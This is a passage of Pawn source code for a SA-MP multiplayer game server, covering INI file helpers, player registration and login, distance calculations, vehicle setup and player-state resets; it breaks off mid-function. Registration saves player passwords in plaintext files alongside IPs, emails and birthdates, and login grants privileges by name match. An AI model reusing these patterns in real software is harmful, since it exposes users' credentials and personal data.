stock fgetstring(filename[],key[])
{
	if(debugstate) printf("fgetstring(%s,%s) start",filename,key);
	new File:fohnd, tmpres[256], tmpres2[256];
	tmpres[0] = -1;
	fohnd = fopen(filename,io_read);
	//if(!fohnd) return tmpres;
	while(fread(fohnd,tmpres))
	{
		StripNewLine(tmpres);
		if(diniEqual(dini_PRIVATE_ExtractKey(tmpres),key,true))
		{
			tmpres2[0]=0;
			strcat(tmpres2,dini_PRIVATE_ExtractValue(tmpres));
			fclose(fohnd);
			if(debugstate) printf("fgetstring(%s,%s) end",filename,key);
			return tmpres2;
		}
	}
	fclose(fohnd);
	if(debugstate) printf("fgetstring(%s,%s) end",filename,key);
	return tmpres;
}
stock fkeyexist(filename[],key[])
{
	new File:fohnd, tmpres[256];
	fohnd = fopen(filename,io_read);
	if(!fohnd) return 0;
	while(fread(fohnd,tmpres))
	{
		StripNewLine(tmpres);
		if(diniEqual(dini_PRIVATE_ExtractKey(tmpres),key,true))
		{
			fclose(fohnd);
			return 1;
		}
	}
	fclose(fohnd);
	return 0;
}
stock fcopytextfile(oldname[],newname[])
{
	new File:ohnd, File:nhnd;
	if(!fexist(oldname)) return 0;
	ohnd = fopen(oldname,io_read), nhnd = fopen(newname,io_write);
	new tmpres[256];
	while(fread(ohnd,tmpres))
	{
		StripNewLine(tmpres);
		format(tmpres,sizeof(tmpres),"%s\r\n",tmpres);
		fwrite(nhnd,tmpres);
	}
	fclose(ohnd);
	fclose(nhnd);
	return 1;
}
//=[fuser]======================================================================
stock fuser(playerid)
{
	new funcstring[64];
	format(funcstring,sizeof(funcstring),"/DM/Users/%s.ini",GetName(playerid));
	return funcstring;
}
//=[fuserban]===================================================================
stock fuserban(playerid[])
{
	new funcstring[64];
	format(funcstring,sizeof(funcstring),"/DM/Bans/%s.ini",playerid);
	return funcstring;
}
//=[RegisterPlayer]=============================================================
stock RegisterPlayer(playerid,pass[])
{
	new f[M_S], string[M_S], d[3];
	getdate(d[2],d[1],d[0]);
	format(f,sizeof(f),fuser(playerid));
	fcreate(f);
	// Password
	fsetstring(f,"Password",pass);
	fsetint(f,"UseChangepass",0);
	fsetstring(f,"RegisterationPassword",pass);
	// Admin Mode
	//fsetint(f,"AdminLevel",0);
	fsetint(f,"TogCMD",0);
	fsetint(f,"TogPM",0);
	fsetint(f,"TogPH",0);
	fsetint(f,"TogGC",0);
	fsetint(f,"TogCC",0);
	fsetint(f,"TogVIP",0);
	fsetstring(f,"Tag2","X");
	fsetint(f,"Ban",0);
	fsetint(f,"MSS",0);
	fsetint(f,"VIPManager",0);
	fsetint(f,"HouseManager",0);
	fsetint(f,"CodesManager",0);
	// Times & Dates
	fsetstring(f,"LastConnectIP",GetIP(playerid));
	fsetstring(f,"RegisterationIP",GetIP(playerid));
	fsetstring(f,"LastChangeIPDate",GetDateAsString());
	fsetstring(f,"LastChangeIPTime",GetTimeAsString());
	fsetstring(f,"RegisterationDate",GetDateAsString());
	fsetstring(f,"RegisterationTime",GetTimeAsString());
	fsetint(f,"LastConnectDay",d[0]);
	fsetint(f,"LastConnectMonth",d[1]);
	fsetint(f,"LastConnectYear",d[2]);
	fsetstring(f,"LastConnectTime",GetTimeAsString());
	fsetint(f,"TimeInServer",playerinfo[playerid][intime][1]);
	fsetint(f,"TotalTimeInServer",playerinfo[playerid][intime][1]);
	fsetstring(f,"LastChangepass","never");
	fsetstring(f,"LastChangename","never");
	// Stats
	fsetint(f,"Kills",playerinfo[playerid][kills]);
	fsetint(f,"Deaths",playerinfo[playerid][deaths]);
	fsetint(f,"Level",playerinfo[playerid][level]);
	fsetint(f,"UPower",playerinfo[playerid][upower]);
	fsetint(f,"UPower2",playerinfo[playerid][upower2]);
	fsetint(f,"BankAccount",playerinfo[playerid][bacc]);
	fsetint(f,"BankCash",playerinfo[playerid][bank]);
	fsetstring(f,"BankPassword","None");
	fsetint(f,"CCard",playerinfo[playerid][ccard]);
	fsetint(f,"Vehicle",playerinfo[playerid][vehicle]);
	fsetint(f,"Drugs",playerinfo[playerid][drugs]);
	fsetint(f,"Pet",playerinfo[playerid][pet][0]);
	fsetint(f,"Armour",playerinfo[playerid][armour]);
	fsetint(f,"LastMoney",playerinfo[playerid][lastmoney]);
	fsetint(f,"XJail1",playerinfo[playerid][xjail]);
	fsetint(f,"VAlarm",playerinfo[playerid][valarm]);
	fsetint(f,"Bomb",playerinfo[playerid][bomb]);
	fsetint(f,"ChangepassLimit",0);
	fsetint(f,"ChangenameLimit",0);
	fsetint(f,"House1",playerinfo[playerid][house]);
	fsetint(f,"Bonus",playerinfo[playerid][bonus_si]);
	// Clan
	fsetstring(f,"Clan2","None");
	fsetint(f,"Leader",0);
	fsetint(f,"ClanManager1",0);
	// Profile
	fsetint(f,"Skin",playerinfo[playerid][skin]);
	fsetint(f,"ICQ",playerinfo[playerid][icq]);
	fsetstring(f,"Messenger",playerinfo[playerid][messenger]);
	fsetstring(f,"Email",playerinfo[playerid][email]);
	fsetstring(f,"Country",playerinfo[playerid][country]);
	fsetint(f,"BirthDay",playerinfo[playerid][birthdate][0]);
	fsetint(f,"BirthMonth",playerinfo[playerid][birthdate][1]);
	fsetint(f,"BirthYear",playerinfo[playerid][birthdate][2]);
	// Setting
	fsetint(f,"IDChat",playerinfo[playerid][idchat]);
	fsetint(f,"ShowJoin",playerinfo[playerid][showjoin]);
	fsetint(f,"ShowQuit",playerinfo[playerid][showquit]);
	fsetint(f,"ShowMT",playerinfo[playerid][showmt]);
	fsetint(f,"AutoLogin",playerinfo[playerid][autologin]);
	fsetint(f,"ShowAFK",playerinfo[playerid][showafk]);
	fsetint(f,"ShowPunish",playerinfo[playerid][showpunish]);
	fsetint(f,"ClassSelection",!playerinfo[playerid][classselection] ? 1 : playerinfo[playerid][classselection]);
	fsetint(f,"SavePMs",playerinfo[playerid][savepms]);
	fsetint(f,"FightingStyle",GetPlayerFightingStyle(playerid));
	// Weapons
	for(new i=0;i<10;i++)
	{
		format(string,sizeof(string),"Weapon%d",i);
		fsetint(f,string,playerinfo[playerid][weapons][i]);
		if(i < 8)
		{
			format(string,sizeof(string),"Ammo%d",i);
			fsetint(f,string,playerinfo[playerid][ammo][i]);
		}
	}
	// Friends
	for(new i=1;i<10;i++)
	{
		format(string,sizeof(string),"Friend%d",i);
		fsetstring(f,string,"None");
	}
	// Diary
	for(new i=1;i<10;i++)
	{
		format(string,sizeof(string),"DiaryLine%d",i);
		fsetstring(f,string,"None");
	}
	return 1;
}
//=[SetString]==================================================================
stock SetString(dest[],source[])
{   // by DracoBlue, improved by me
	new count = strlen(source), i = 0;
	for(i=0;i<count;i++) dest[i] = source[i];
	dest[count] = 0;
	return 1;
}
//=[IsPlayerInCircle]===========================================================
stock IsPlayerInCircle(playerid,Float:x,Float:y,Float:radius)
{   // by Sacky, improved by me
	if(GetPlayerDistanceToPoint(playerid,x,y) < radius) return 1;
	return 0;
}
//=[GetPlayerDistanceToPoint]===================================================
stock GetPlayerDistanceToPoint(playerid,Float:x,Float:y)
{   // by Sacky, improved by me
	new Float:x1, Float:y1, Float:z1, Float:tmpdis;
	GetPlayerPos(playerid,x1,y1,z1);
	tmpdis = floatsqroot(floatpower(floatabs(floatsub(x,x1)),2)+floatpower(floatabs(floatsub(y,y1)),2));
	return floatround(tmpdis);
}
//=[IsPlayerInSphere]===========================================================
stock IsPlayerInSphere(playerid,Float:x,Float:y,Float:z,Float:radius) return GetPlayerDistanceToPointEx(playerid,x,y,z) < radius? 1:0;// by Sacky, improved by me
//=[GetPlayerDistanceToPointEx]=================================================
stock GetPlayerDistanceToPointEx(playerid,Float:x,Float:y,Float:z)
{   // by Sacky, improved by me
	new Float:x1, Float:y1, Float:z1, Float:tmpdis;
	GetPlayerPos(playerid,x1,y1,z1);
	tmpdis = floatsqroot(floatpower(floatabs(floatsub(x,x1)),2)+floatpower(floatabs(floatsub(y,y1)),2)+floatpower(floatabs(floatsub(z,z1)),2));
	return floatround(tmpdis);
}
//=[DistanceToPoint]============================================================
stock DistanceToPoint(Float:x1,Float:y1,Float:z1,Float:x,Float:y,Float:z)
{
	new Float:tmpdis = floatsqroot(floatpower(floatabs(floatsub(x,x1)),2)+floatpower(floatabs(floatsub(y,y1)),2)+floatpower(floatabs(floatsub(z,z1)),2));
	return floatround(tmpdis);
}
//=[ObjectToPoint]==============================================================
stock ObjectToPoint(Float:radi,objectid,Float:x,Float:y,Float:z)
{
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetSObjectPos(objectid,oldposx,oldposy,oldposz);
	tempposx = (oldposx-x),tempposy = (oldposy-y), tempposz = (oldposz-z);
	if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) return 1;
	return 0;
}
//=[GetDistanceBetweenPlayers]==================================================
stock GetDistanceBetweenPlayers(playerid,playerid2)
{
	new Float:p[3];
	GetPlayerPos(playerid2,p[0],p[1],p[2]);
	return GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]);
}
//=[CreateVehicleEx]============================================================
stock CreateVehicleEx(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,respawn_delay=respawntime,interior=0,world=world_normal)
{
	new v = INVALID_VEHICLE_ID;
	if(modelid == 449 || modelid == 537 || modelid == 538) v = AddStaticVehicleEx(modelid,x,y,z,a,color1,color2,respawn_delay);
	else v = CreateVehicle(modelid,x,y,z,a,color1,color2,respawn_delay);
	LinkVehicleToInterior(v,interior);
	SetVehicleVirtualWorld(v,world);
	vehicleinfo[v][lastdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][locked] = 0;
	vehicleinfo[v][store] = 0;
	vehicleinfo[v][storecost] = 0;
	vehicleinfo[v][racedriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][kartdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][monsterdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][vvalid] = 1;
	vehicleinfo[v][vemodel] = modelid;
	vehicleinfo[v][vpos][0] = x;
	vehicleinfo[v][vpos][1] = y;
	vehicleinfo[v][vpos][2] = z;
	vehicleinfo[v][vpos][3] = a;
	vehicleinfo[v][vcol][0] = color1;
	vehicleinfo[v][vcol][1] = color2;
	vehicleinfo[v][veint] = interior;
	vehicleinfo[v][veworld] = world;
	return v;
}
//=[CreateVehicleEx_Store]======================================================
stock CreateVehicleEx_Store(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,respawn_delay,interior,world,cost)
{
	new v = INVALID_VEHICLE_ID, s[M_S];
	if(modelid == 449 || modelid == 537 || modelid == 538) v = AddStaticVehicleEx(modelid,x,y,z,a,color1,color2,respawn_delay);
	else v = CreateVehicle(modelid,x,y,z,a,color1,color2,respawn_delay);
	LinkVehicleToInterior(v,interior);
	SetVehicleVirtualWorld(v,world);
	vehicleinfo[v][lastdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][locked] = 0;
	vehicleinfo[v][store] = 1;
	vehicleinfo[v][storecost] = cost;
	vehicleinfo[v][racedriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][kartdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][monsterdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][vvalid] = 1;
	vehicleinfo[v][vemodel] = modelid;
	vehicleinfo[v][vpos][0] = x;
	vehicleinfo[v][vpos][1] = y;
	vehicleinfo[v][vpos][2] = z;
	vehicleinfo[v][vpos][3] = a;
	vehicleinfo[v][vcol][0] = color1;
	vehicleinfo[v][vcol][1] = color2;
	vehicleinfo[v][veint] = interior;
	vehicleinfo[v][veworld] = world;
	fileCheck(file_vstore);
	format(s,sizeof(s),"Vehicle%d",v);
	if(!fkeyexist(file_vstore,s)) fsetstring(file_vstore,s,"None");
	return v;
}
//=[CreateVIPVehicle]===========================================================
stock CreateVIPVehicle(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,respawn_delay=respawntime,interior=0,world=world_normal)
{
	new v = CreateVehicleEx(modelid,x,y,z,a,color1,color2,respawn_delay,interior,world);
	vehicleinfo[v][vevip] = 1;
	return v;
}
//=[DestroyVehicleEx]===========================================================
stock DestroyVehicleEx(v)
{
	if(!IsValidVehicle(v)) return 0;
	DestroyVehicle(v);
	vehicleinfo[v][lastdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][locked] = 0;
	vehicleinfo[v][store] = 0;
	vehicleinfo[v][storecost] = 0;
	vehicleinfo[v][racedriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][kartdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][monsterdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][vvalid] = 0;
	vehicleinfo[v][vemodel] = -1;
	return 1;
}
//=[IsValidVehicle]=============================================================
stock IsValidVehicle(v) return vehicleinfo[v][vvalid];
//=[GetTimeAsString]============================================================
stock GetTimeAsString()
{
	new t[3], s[M_S];
	gettime(t[0],t[1],t[2]);
	format(s,sizeof(s),"%d:%d",t[0],t[1]);
	return s;
}
//=[GetDateAsString]============================================================
stock GetDateAsString(tav = '/')
{
	new d[3], s[M_S];
	getdate(d[0],d[1],d[2]);
	format(s,sizeof(s),"%d%c%d%c%d",d[2],tav,d[1],tav,d[0]);
	return s;
}
//=[IsValidSkin]================================================================
stock IsValidSkin(skinid)
{
	new BadSkins[] = {3,4,5,6,8,42,65,74,86,119,149,208,268,273,289};
	if(skinid < 0 || skinid > 299) return 0;
	for(new i=0;i<sizeof(BadSkins);i++) if(skinid == BadSkins[i]) return 0;
	return 1;
}
//=[LoginPlayer]================================================================
stock LoginPlayer(playerid)
{
	new f[M_S], string[M_S], d[3];
	getdate(d[2],d[1],d[0]);
	for(new i=0;i<sizeof(adminnames);i++) if(!strcmp(GetName(playerid),adminnames[i],false)) playerinfo[playerid][pp] = 1;
	playerinfo[playerid][logged] = 1;
	format(f,sizeof(f),fuser(playerid));
	fsetstring(f,"LastConnectIP",GetIP(playerid));
	fsetstring(f,"LastChangeIPDate",GetDateAsString());
	fsetstring(f,"LastChangeIPTime",GetTimeAsString());
	fsetint(f,"LastConnectDay",d[0]);
	fsetint(f,"LastConnectMonth",d[1]);
	fsetint(f,"LastConnectYear",d[2]);
	fsetstring(f,"LastConnectTime",GetTimeAsString());
	//playerinfo[playerid][admin] = fgetint(f,"AdminLevel");
	//playerinfo[playerid][admin] = fgetint(file_admins,GetName(playerid));
	playerinfo[playerid][togcmd] = fgetint(f,"TogCMD");
	playerinfo[playerid][togpm] = fgetint(f,"TogPM");
	playerinfo[playerid][togph] = fgetint(f,"TogPH");
	playerinfo[playerid][toggc] = fgetint(f,"TogGC");
	playerinfo[playerid][togcc] = fgetint(f,"TogCC");
	playerinfo[playerid][togvip] = fgetint(f,"TogVIP");
	playerinfo[playerid][vipmanager] = fgetint(f,"VIPManager");
	playerinfo[playerid][housemanager] = fgetint(f,"HouseManager");
	playerinfo[playerid][codesmanager] = fgetint(f,"CodesManager");
	playerinfo[playerid][kills] = fgetint(f,"Kills");
	playerinfo[playerid][deaths] = fgetint(f,"Deaths");
	playerinfo[playerid][level] = fgetint(f,"Level");
	if(!fkeyexist(f,"UPower"))
	{
	    fsetint(f,"UPower",-1);
	    playerinfo[playerid][upower] = -1;
	}
	else playerinfo[playerid][upower] = fgetint(f,"UPower");
	if(!fkeyexist(f,"UPower2"))
	{
	    fsetint(f,"UPower2",-1);
	    playerinfo[playerid][upower2] = -1;
	}
	else playerinfo[playerid][upower2] = fgetint(f,"UPower2");
	for(new i = 0; i < sizeof(lcmds); i++)
	{
		format(string,sizeof(string),"UpgradeCMD%d",i);
		playerinfo[playerid][upgradecmd][i] = fkeyexist(fuser(playerid),string) ? fgetint(fuser(playerid),string) : 1;
	}
	if(fkeyexist(f,"Bank1"))
	{
		new cur = fgetint(f,"Bank1");
		fsetint(f,"Bank2",cur > 30000000? 0:cur/2);
		fremovekey(f,"Bank1");
	}
	if(fkeyexist(f,"Bank"))
	{
		new cur = fgetint(f,"Bank");
		fsetint(f,"Bank2",cur > 50000000 ? 0 : cur / 2);
		fremovekey(f,"Bank");
	}
	playerinfo[playerid][bacc] = fgetint(f,"BankAccount");
	if(!fkeyexist(f,"BankPassword")) fsetstring(f,"BankPassword","None");
	playerinfo[playerid][bank] = fgetint(f,"BankCash");
	playerinfo[playerid][ccard] = fgetint(f,"CCard");
	if(fkeyexist(f,"Vehicle1")) fremovekey(f,"Vehicle1");
	playerinfo[playerid][vehicle] = fgetint(f,"Vehicle");
	format(string,sizeof(string),"Vehicle%d",playerinfo[playerid][vehicle]);
	if((playerinfo[playerid][vehicle] != -1 && !vehicleinfo[playerinfo[playerid][vehicle]][store]) || (fkeyexist(file_vstore,string) && !equal(fgetstring(file_vstore,string),GetName(playerid))))
	{
		fsetstring(f,"Vehicle","None");
		playerinfo[playerid][vehicle] = -1;
	}
	playerinfo[playerid][drugs] = fgetint(f,"Drugs");
	playerinfo[playerid][pet][0] = fgetint(f,"Pet");
	playerinfo[playerid][pet][2] = 0;
	playerinfo[playerid][pet][3] = 0;
	format(string,sizeof(string),GetName(playerid));
	charreplace(string,'(','<');
	charreplace(string,')','>');
	playerinfo[playerid][vip] = fkeyexist(file_vip,string) ? fgetint(file_vip,string) : 0;
	playerinfo[playerid][armour] = fgetint(f,"Armour");
	playerinfo[playerid][lastmoney] = fgetint(f,"LastMoney");
	if(playerinfo[playerid][lastmoney] > 0)
	{
		format(string,sizeof(string)," .ëñôê ðùîø îëéååï ùäùøú ðôì áæîï ùùéç÷ú áå: %d$",playerinfo[playerid][lastmoney]);
		SendClientMessage(playerid,green,string);
		GiveMoney(playerid,playerinfo[playerid][lastmoney]);
		playerinfo[playerid][lastmoney] = 0;
		fsetint(fuser(playerid),"LastMoney",0);
	}
	playerinfo[playerid][xjail] = fgetint(f,"XJail1");
	if(playerinfo[playerid][xjail])
	{
		SetPlayerPos(playerid,264.3591,77.5832,1001.0391);
		SetPlayerFacingAngle(playerid,270.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,6);
		SetFreeze(playerid,1);
	}
	playerinfo[playerid][valarm] = fgetint(f,"VAlarm");
	playerinfo[playerid][bomb] = fgetint(f,"Bomb");
	playerinfo[playerid][bonus_si] = fgetint(f,"Bonus");
	if(!fkeyexist(f,"House1")) fsetint(f,"House1",-1);
	playerinfo[playerid][house] = fgetint(f,"House1");
	if(playerinfo[playerid][house] != -1) playerinfo[playerid][houseacc][playerinfo[playerid][house]] = 1;
	if(!fkeyexist(fuser(playerid),"Clan2")) fsetstring(fuser(playerid),"Clan2","None");
	if(IsNumeric(fgetstring(f,"Clan2")))
	{
		new c = fgetint(f,"Clan2");
		if(c >= 0 && claninfo[c][cvalid]) fsetstring(f,"Clan2",claninfo[c][cname]);
		else fsetstring(f,"Clan2","None");
	}
	playerinfo[playerid][clan] = clannumber(fgetstring(f,"Clan2"));
	if(playerinfo[playerid][clan] == -1 || playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid])
	{
		playerinfo[playerid][clan] = 0;
		fsetstring(f,"Clan2","None");
	}
	if(playerinfo[playerid][clan] != 0)
	{
		claninfo[playerinfo[playerid][clan]][cplayers][claninfo[playerinfo[playerid][clan]][cmembers]] = playerid;
		claninfo[playerinfo[playerid][clan]][cmembers]++;
	}
	playerinfo[playerid][lclan] = fgetint(f,"Leader");
	playerinfo[playerid][tclan] = fgetint(f,"Tester");
	playerinfo[playerid][clanmanager] = fgetint(f,"ClanManager1");
	playerinfo[playerid][mss] = fgetint(f,"MSS");
	playerinfo[playerid][skin] = fgetint(f,"Skin");
	playerinfo[playerid][icq] = fgetint(f,"ICQ");
	format(playerinfo[playerid][messenger],30,fgetstring(f,"Messenger"));
	format(playerinfo[playerid][email],30,fgetstring(f,"Email"));
	format(playerinfo[playerid][country],30,fgetstring(f,"Country"));
	playerinfo[playerid][birthdate][0] = fgetint(f,"BirthDay");
	playerinfo[playerid][birthdate][1] = fgetint(f,"BirthMonth");
	playerinfo[playerid][birthdate][2] = fgetint(f,"BirthYear");
	format(playerinfo[playerid][rname],30,fgetstring(f,"RealName"));
	playerinfo[playerid][idchat] = fgetint(f,"IDChat");
	playerinfo[playerid][showjoin] = fgetint(f,"ShowJoin");
	playerinfo[playerid][showquit] = fgetint(f,"ShowQuit");
	playerinfo[playerid][showmt] = fgetint(f,"ShowMT");
	playerinfo[playerid][autologin] = fgetint(f,"AutoLogin");
	playerinfo[playerid][showafk] = fgetint(f,"ShowAFK");
	playerinfo[playerid][showpunish] = fgetint(f,"ShowPunish");
	playerinfo[playerid][classselection] = fgetint(f,"ClassSelection");
	playerinfo[playerid][savepms] = fgetint(f,"SavePMs");
	SetPlayerFightingStyle(playerid,fgetint(f,"FightingStyle"));
	if(!playerinfo[playerid][classselection])
	{
		playerinfo[playerid][classselection] = 1;
		fsetint(f,"ClassSelection",1);
	}
	for(new i=0;i<10;i++)
	{
		format(string,sizeof(string),"Weapon%d",i);
		playerinfo[playerid][weapons][i] = fgetint(f,string);
		if(i < 8)
		{
			format(string,sizeof(string),"Ammo%d",i);
			playerinfo[playerid][ammo][i] = fgetint(f,string);
		}
	}
	for(new i=0;i<props;i++)
	{
		format(string,sizeof(string),"/DM/Properties/%d.ini",i);
		if(equal(fgetstring(string,"Owner"),GetName(playerid))) propinfo[i][owner] = playerid;
	}
	if(d[1] == playerinfo[playerid][birthdate][1] && d[0] == playerinfo[playerid][birthdate][0])
	{
		format(string,sizeof(string)," !îæì èåá ,%s éåí äåìãú %d ì",GetName(playerid),d[2]-playerinfo[playerid][birthdate][2]);
		SendClientMessageToAll(orange,string);
	}
	if(DaysBetweenDates(fgetstring(f,"LastChangepass"),GetDateAsString()) > 0) fsetint(f,"ChangepassLimit",0);
	if(DaysBetweenDates(fgetstring(f,"LastChangename"),GetDateAsString()) > 0) fsetint(f,"ChangenameLimit",0);
	SetPlayerColor(playerid,GetColor(playerid,153));
	for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,153));
	//format(playerinfo[playerid][tag],256,IsPlayerMAdmin(playerid)? (strlen(fgetstring(f,"Tag2")) > 1? (fgetstring(f,"Tag2")):("Admin")):(fgetstring(f,"Tag2")));
	format(playerinfo[playerid][tag],256,fgetstring(f,"Tag2"));
	return 1;
}
//=[ResetInfo]==================================================================
stock ResetInfo(playerid)
{
	dbg(100,"1");
	playerinfo[playerid][afk] = 0;
	for(new i=0;i<3;i++) playerinfo[playerid][startpos][i] = 0.0;
	playerinfo[playerid][spawned] = 0;
	playerinfo[playerid][logged] = 0;
	playerinfo[playerid][admin] = 0;
	playerinfo[playerid][admlog] = 0;
	playerinfo[playerid][faileds] = 0;
	playerinfo[playerid][intime] = {0,0};
	for(new i=0;i<3;i++) playerinfo[playerid][color][i] = randomEx(5,250);
	dbg(100,"2");
	playerinfo[playerid][kills] = 0;
	playerinfo[playerid][deaths] = 0;
	playerinfo[playerid][level] = 1;
	playerinfo[playerid][upower] = -1;
	playerinfo[playerid][charge] = 0;
	playerinfo[playerid][upower2] = -1;
	playerinfo[playerid][charge2] = 0;
	playerinfo[playerid][upower3] = {-1,-1};
	playerinfo[playerid][bank] = 0;
	playerinfo[playerid][ccard] = 0;
	playerinfo[playerid][weapons] = {0,0,0,0,0,0,0,0,0,0};
	playerinfo[playerid][ammo] = {0,0,0,0,0,0,0,0};
	playerinfo[playerid][vehicle] = -1;
	playerinfo[playerid][skin] = 300;
	playerinfo[playerid][icq] = 0;
	format(playerinfo[playerid][messenger],30,"None");
	format(playerinfo[playerid][email],30,"None");
	format(playerinfo[playerid][country],30,"None");
	format(playerinfo[playerid][rname],30,"None");
	playerinfo[playerid][birthdate] = {0,0,0};
	format(playerinfo[playerid][lastmetext],256," ");
	format(playerinfo[playerid][lasttext],256," ");
	format(playerinfo[playerid][lastpmtext],256," ");
	for(new i=0;i<7;i++) playerinfo[playerid][death][i] = 0;
	playerinfo[playerid][invisible] = 0;
	playerinfo[playerid][cp] = -1;
	playerinfo[playerid][incp] = 0;
	dbg(100,"3");
	#if acmoney == 2
		playerinfo[playerid][money] = {0,0,0};
		playerinfo[playerid][moneywarns] = 0;
	#elseif acmoney == 1
		playerinfo[playerid][money] = {0,0};
	#endif
	playerinfo[playerid][propertyid] = -1;
	playerinfo[playerid][waitwar] = 0;
	playerinfo[playerid][inwar] = 0;
	playerinfo[playerid][waitrace] = 0;
	playerinfo[playerid][warid] = 0;
	playerinfo[playerid][inrace] = 0;
	playerinfo[playerid][racecp] = 0;
	playerinfo[playerid][raceid] = 0;
	playerinfo[playerid][waitwwe] = 0;
	playerinfo[playerid][inwwe] = 0;
	playerinfo[playerid][wweid] = 0;
	playerinfo[playerid][viewerwwe] = 0;
	playerinfo[playerid][work] = work_none;
	playerinfo[playerid][coplevel] = 0;
	playerinfo[playerid][doctorlevel] = 0;
	playerinfo[playerid][drivecost] = 0;
	playerinfo[playerid][killerlevel] = 0;
	playerinfo[playerid][icecreamcost] = 0;
	playerinfo[playerid][drugs] = 0;
	playerinfo[playerid][drugsp] = 0;
	playerinfo[playerid][drugscost] = 0;
	playerinfo[playerid][plotto] = -1;
	playerinfo[playerid][dmzone] = dmz_none;
	dbg(100,"4");
	if(playerinfo[playerid][pet][2])
	{
		if(IsValidSObject(playerinfo[playerid][pet][1])) DestroySObject(playerinfo[playerid][pet][1]);
		if(playerinfo[playerid][pet][3]) KillTimer(playerinfo[playerid][pet][4]);
	}
	for(new i=0;i<3;i++) if(i != 1) playerinfo[playerid][pet][i] = 0;
	playerinfo[playerid][dinvited] = -1;
	playerinfo[playerid][dinviter] = 0;
	playerinfo[playerid][bet] = 0;
	playerinfo[playerid][indrift] = 0;
	playerinfo[playerid][binvited] = -1;
	playerinfo[playerid][binviter] = 0;
	if(playerinfo[playerid][dcd][0] > 0) KillTimer(playerinfo[playerid][dcd][1]);
	playerinfo[playerid][dcd][0] = 0;
	playerinfo[playerid][inbattle] = 0;
	playerinfo[playerid][bweapon] = 0;
	playerinfo[playerid][bplace] = 0;
	if(playerinfo[playerid][bcd][0] > 0) KillTimer(playerinfo[playerid][bcd][1]);
	playerinfo[playerid][bcd][0] = 0;
	playerinfo[playerid][gwarnings] = 0;
	for(new i=0;i<3;i++) playerinfo[playerid][aapos][i] = 0.0;
	playerinfo[playerid][aasetp] = 0;
	if(playerinfo[playerid][mute][0] > 0) KillTimer(playerinfo[playerid][mute][1]);
	playerinfo[playerid][mute][0] = 0;
	if(playerinfo[playerid][jail][0] > 0) KillTimer(playerinfo[playerid][jail][1]);
	playerinfo[playerid][jail][0] = 0;
	playerinfo[playerid][togcmd] = 0;
	playerinfo[playerid][togsay] = 0;
	playerinfo[playerid][togpm] = 0;
	playerinfo[playerid][togph] = 0;
	playerinfo[playerid][toggc] = 0;
	playerinfo[playerid][togcc] = 0;
	playerinfo[playerid][togvip] = 0;
	playerinfo[playerid][showme] = 1;
	playerinfo[playerid][spectate] = -1;
	playerinfo[playerid][aause] = 0;
	playerinfo[playerid][bonus] = {0,0,0,0};
	PlayerLeaveGang(playerid,0);
	playerinfo[playerid][gang] = 0;
	playerinfo[playerid][igang] = -1;
	for(new i=0;i<max_objects;i++) if(IsValidPlayerObject(playerid,i)) DestroyPlayerObject(playerid,i);
	playerinfo[playerid][calling] = -1;
	playerinfo[playerid][canswer] = 0;
	playerinfo[playerid][callid] = 0;
	playerinfo[playerid][caller] = 0;
	playerinfo[playerid][class] = -1;
	playerinfo[playerid][waitkart] = 0;
	playerinfo[playerid][inkart] = 0;
	playerinfo[playerid][waitmonster] = 0;
	playerinfo[playerid][inmonster] = 0;
	playerinfo[playerid][vip] = 0;
	playerinfo[playerid][armour] = 0;
	playerinfo[playerid][gw] = 0;
	playerinfo[playerid][reqclass] = 1;
	playerinfo[playerid][idchat] = 0;
	playerinfo[playerid][showjoin] = 1;
	playerinfo[playerid][showquit] = 1;
	playerinfo[playerid][showmt] = 1;
	playerinfo[playerid][autologin] = 1;
	playerinfo[playerid][showafk] = 1;
	playerinfo[playerid][showpunish] = 1;
	playerinfo[playerid][classselection] = 1;
	dbg(100,"5");
	if(playerinfo[playerid][gm])
	{
		if(IsPlayerInAnyVehicle(playerid)) SetVehicleHealth(GetPlayerVehicleID(playerid),1000.0);
		SetPlayerHealth2(playerid,100.0);
	}
	playerinfo[playerid][gm] = 0;
	for(new i=0;i<props;i++) if(propinfo[i][owner] == playerid) propinfo[i][owner] = INVALID_PLAYER_ID;
	playerinfo[playerid][inact] = 0;
	for(new i=0;i<2;i++) playerinfo[playerid][lastcoords][i] = 0.0;
	playerinfo[playerid][nocmd] = 0;
	playerinfo[playerid][nopm] = 0;
	playerinfo[playerid][mtime] = 0;
	dbg(100,"6");
	for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = 0.0;
	playerinfo[playerid][mark2] = {0,world_normal,0};
	playerinfo[playerid][flood] = {0,0,0,0};
	playerinfo[playerid][fwarns] = {0,0,0};
	format(playerinfo[playerid][tag],256,"");
	for(new i=0;i<4;i++) playerinfo[playerid][slastpos][i] = 0.0;
	playerinfo[playerid][slastdata] = {0,0,0,0};
	playerinfo[playerid][incam] = 0;
	playerinfo[playerid][gmtimer] = 0;
	playerinfo[playerid][lastskin] = GetPlayerSkin(playerid);
	for(new i=0;i<MAX_PLAYERS;i++) playerinfo[playerid][ignore][i] = 0;
	playerinfo[playerid][disconnect] = 0;
	playerinfo[playerid][dmzkills] = 0;
	playerinfo[playerid][frozen] = 0;
	for(new i=0;i<3;i++) playerinfo[playerid][freezepos][i] = 0.0;
	dbg(100,"7");
	playerinfo[playerid][blockpms] = 0;
